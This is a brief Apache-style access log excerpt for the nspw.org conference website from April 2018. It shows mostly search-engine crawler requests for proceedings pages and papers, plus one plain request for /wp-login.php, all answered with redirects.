www.nspw.org:80 54.36.148.15 - - [30/Apr/2018:21:33:27 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 551 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:33:43 -0400] "GET /2006/tmp/ HTTP/1.1" 302 510 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:33:47 -0400] "GET /2016/cfp HTTP/1.1" 302 508 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:34:12 -0400] "GET /2003/local.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.76 - - [30/Apr/2018:21:34:23 -0400] "GET /2009/proceedings/2000/nspw2000-daniels.pdf HTTP/1.1" 302 613 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:34:34 -0400] "GET /2006/tmp/?C=S%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:34:41 -0400] "GET /papers/2009/nspw2009-gates.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:35:12 -0400] "GET /2009/local.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 106.215.61.91 - - [30/Apr/2018:21:35:27 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 106.215.61.91 - - [30/Apr/2018:21:35:31 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 42.236.99.58 - - [30/Apr/2018:21:35:40 -0400] "GET / HTTP/1.1" 302 525 "http://nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:35:44 -0400] "GET /2009/local.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 42.236.99.16 - - [30/Apr/2018:21:35:46 -0400] "GET / HTTP/1.1" 302 529 "http://www.nspw.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:35:52 -0400] "GET /papers/1994/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:35:54 -0400] "GET /2009/local.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
